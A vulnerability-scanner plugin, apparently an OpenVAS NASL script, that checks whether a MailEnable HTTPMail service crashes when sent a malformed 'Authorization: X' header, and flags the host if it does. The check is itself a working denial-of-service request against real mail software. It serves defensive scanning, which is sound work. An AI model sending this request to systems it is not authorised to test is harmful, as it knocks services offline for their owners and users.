if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.14654" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_name( "MailEnable HTTPMail Service Authorization Header DoS Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2004 George A. Theall" );
	script_family( "Denial of Service" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_mandatory_keys( "MailEnable/banner" );
	script_require_ports( "Services/www", 8080 );
	script_tag( name: "solution", value: "Upgrade to MailEnable Professional / Enterprise 1.19 or later." );
	script_tag( name: "summary", value: "The remote web server is affected by a denial of service flaw." );
	script_tag( name: "insight", value: "The remote host is running an instance of MailEnable that has a flaw
  in the HTTPMail service (MEHTTPS.exe) in the Professional and Enterprise Editions. The flaw can be
  exploited by issuing an HTTP request with a malformed Authorization header, which causes a NULL
  pointer dereference error and crashes the HTTPMail service." );
	script_xref( name: "URL", value: "http://www.oliverkarow.de/research/MailWebHTTPAuthCrash.txt" );
	script_xref( name: "URL", value: "http://archives.neohapsis.com/archives/bugtraq/2004-05/0159.html" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 8080 );
banner = http_get_remote_headers( port: port );
if(!banner || !egrep( pattern: "^Server: .*MailEnable", string: banner )){
	exit( 0 );
}
if(http_is_dead( port: port )){
	exit( 0 );
}
req = NASLString( "GET / HTTP/1.0\\r\\n", "Host: ", get_host_ip(), "\\r\\n", "Authorization: X\\r\\n", "\\r\\n" );
res = http_send_recv( port: port, data: req );
if(!res && http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

